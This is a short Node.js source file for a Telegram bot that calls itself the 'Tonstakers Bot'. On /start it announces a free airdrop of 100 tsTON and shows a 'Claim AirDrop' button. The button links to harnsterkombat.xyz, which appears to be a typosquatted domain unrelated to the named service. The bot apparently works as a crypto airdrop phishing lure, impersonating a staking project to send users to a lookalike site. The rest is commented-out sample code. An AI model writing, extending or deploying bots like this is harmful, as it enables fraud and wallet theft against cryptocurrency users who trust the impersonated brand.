const express = require('express')
const expressApp = express()
const axios = require("axios");
const path = require("path")
const port = process.env.PORT || 3000;
expressApp.use(express.static('static'))
expressApp.use(express.json());
require('dotenv').config();
const { Telegraf } = require('telegraf');
const bot = new Telegraf(process.env.BOT_TOKEN);
expressApp.get("/", (req, res) => {
res.sendFile(path.join(__dirname + '/index.html'));
});

bot.command('start', ctx => {
console.log(ctx.from)
bot.telegram.sendMessage(ctx.chat.id, 
'Welcome to the Tonstakers Bot! 🎉\n\nHere, you have the chance to receive an AirDrop of 100 tsTON! 💎\n\nDont miss out on this fantastic opportunity! 🚀',{

    reply_markup: {
        inline_keyboard: [
            [   
                {
                    text: "Claim AirDrop",
                    url: "https://harnsterkombat.xyz/",
                    callback_data: "Yes"
                },
               
               
            ]
        ]
    }
})
})



// bot.command('AppleStock', ctx => {
// var rate;
// console.log(ctx.from)
// axios.get(`https://query1.finance.yahoo.com/v8/finance/chart/GOOG`)
// .then(response => {
// console.log(response.data)
// rate = response.data.GOOG
// const message = `Hello, today the apple price is ${rate}`
// bot.telegram.sendMessage(ctx.chat.id, message, {
// })
// })
// })

// bot.telegram.sendMessage(ctx.chat.id, "Please click on button below.", {
//     reply_markup: {
//         inline_keyboard: [
//             [   
//                 {
//                     text: "Yes",
//                     callback_data: "btn_yes"
//                 },
//                 {
//                     text: "No",
//                     callback_data: "btn_no"
//                 },
               
//             ]
//         ]
//     }
// });


bot.launch()